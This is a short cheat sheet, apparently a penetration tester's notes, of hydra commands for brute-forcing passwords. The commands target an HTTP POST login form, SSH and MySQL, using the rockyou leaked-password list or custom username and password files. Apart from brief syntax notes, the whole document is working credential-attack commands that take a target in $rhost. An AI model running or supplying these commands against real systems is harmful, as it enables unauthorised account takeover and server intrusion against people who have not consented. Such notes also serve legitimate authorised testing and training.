# bruteforce via post request

rhost contains just the dns or ip. When the form isnt in the root path specify
the url befor *:username*. Text for failed login attempt can be set after
*:F*.

```
hydra -l <username> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
    "$rhost" http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
```

# bruteforce via ssh

```
hydra -l <username> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
    "$rhost" -t 4 ssh
```

# bruteforce ssh with custom wordlist

```
hydra -L pot-user.txt -P pot-password.txt "$rhost" -t 4 ssh
```

# bruteforce sql

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $rhost mysql
```
